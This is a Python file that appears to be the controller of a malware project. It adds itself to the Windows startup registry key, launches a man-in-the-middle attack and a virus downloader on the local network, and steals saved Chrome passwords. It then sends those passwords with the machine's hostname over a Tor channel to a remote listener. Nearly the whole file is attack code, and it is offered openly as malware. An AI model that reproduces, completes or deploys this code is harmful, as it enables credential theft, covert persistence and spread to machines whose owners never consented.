import infector, attack, Master.torConnection as torConnection
import time, threading, socket

def firstRun():
    import winreg
    # Specify the path and name of the file to add to the registry
    file_path = r"C:\path\to\file.exe"
    # Open the registry key where the file will be added
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
    # Add the file to the registry
    winreg.SetValueEx(key, "File Name", 0, winreg.REG_SZ, file_path)
    # Set the file to run with admin privileges'
    winreg.SetValueEx(key, "File Name", 0, winreg.REG_SZ, "cmd.exe /c start \"\" \"%s\" -runas" % file_path)
    # Close the registry key
    winreg.CloseKey(key)

    #get the actual download The Victim Downloaded and open it


infector.ManInTheMiddleNetwork()
time.sleep(10)

#create threads for these two
networkAttackingThread = threading.Thread(target= infector.activate_attack).start()
networkVirusDownloaderThread = threading.Thread(target= infector.downloader).start()

networkVirusDownloaderThread = threading.Thread(target= torConnection.hearingLoop).start()

chromePasswords = attack.getChromePasswords()
torConnection.sendMessage("Chrome Passwords: "+chromePasswords + "Name: " + socket.gethostname())

torConnection.hearingLoop()


